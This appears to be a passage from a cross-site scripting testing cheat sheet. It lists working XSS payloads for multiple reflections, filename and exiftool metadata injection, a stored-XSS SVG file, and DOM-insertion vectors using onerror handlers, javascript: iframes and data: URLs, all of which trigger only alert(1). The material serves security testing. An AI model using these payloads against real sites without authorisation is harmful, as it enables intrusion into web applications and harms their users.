Multi Reflection – Double Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
Multi Reflection – Triple Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
Multi Input Reflections (Double & Triple)
Use to take advantage of multiple input reflections on same page.
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
File Upload Injection – Filename
Use when uploaded filename is reflected somewhere in target page.
"><svg onload=alert(1)>.gif
File Upload Injection – Metadata
Use when metadata of uploaded file is reflected somewhere in target page. It uses
command-line exiftool and any metadata field can be set.
brute@logic:~$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
File Upload Injection – SVG File
Use to create a stored XSS on target when uploading image files. Save content below
as “xss.svg”.
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
DOM Insert Injection
Use to test for XSS when injection gets inserted into DOM as valid markup instead of
being reflected in source code. It works for cases where script tag and other vectors
won’t work.
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
DOM Insert Injection – Resource Request
Use when javascript code of the page inserts into page the results of a request to an
URL controlled by attacker (injection).
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
